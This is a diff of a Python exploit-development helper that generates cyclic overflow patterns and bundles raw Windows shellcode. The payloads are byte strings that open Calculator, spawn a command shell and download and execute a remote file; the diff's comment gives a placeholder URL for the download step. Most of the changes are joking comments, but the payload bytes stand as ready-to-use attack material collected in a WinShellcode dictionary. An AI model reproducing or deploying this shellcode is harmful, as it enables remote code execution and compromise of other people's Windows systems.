@@ -1,6 +1,7 @@
 import sys, os, socket, random, struct, ctypes, binascii
 from binascii import unhexlify, hexlify
 
+# For creation of patterns. Change these as you like
 seta="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 setb="abcdefghijklmnopqrstuvwxyz"
 setc="0123456789"
@@ -23,7 +24,7 @@ class List(object):
 
 class Pattern(object):
     pattern = None
-
+    # Don't hit me
     def __init__(self, length):
         string="" ; a=0 ; b=0 ; c=0
         while len(string) < length:
@@ -72,6 +73,9 @@ class Shellcode(object):
 
 
 
+# Add linux shellcodes too? 
+# Of course I created this entire project with windows in mind. (hmm sister plugin for immdbg; yay or nay :p; even tho it already has most features you will ever need)
+
 WOpenCalc = ("\xba\x6a\x33\x5d\x9d\xdb\xcd\xd9\x74\x24\xf4\x58\x29"
 "\xc9\xb1\x30\x83\xc0\x04\x31\x50\x0f\x03\x50\x65\xd1"
 "\xa8\x61\x91\x97\x53\x9a\x61\xf8\xda\x7f\x50\x38\xb8"
@@ -117,7 +121,7 @@ WinDlExec = ("\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B"
 "\x5B\x68\x65\x73\x73\x61\x83\x6C\x24\x03"
 "\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69"
 "\x74\x54\x53\xFF\xD2\xFF\xD0\xE8\xB4\xFF"
-"\xFF\xFF") # + http://url.net/xy.txt
+"\xFF\xFF") # + http://url.net/file.txt
 
 WCmd = ("\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
     "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
@@ -139,7 +143,7 @@ WCmd = ("\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
     "\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
     "\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"
     "\x24\x20\x57\xFF\xD0")
-
+# Because I can?
 WinShellcode = {"Calc":WOpenCalc, "Cmd":WCmd, "DownloadAndExecute":WinDlExec}
 
 
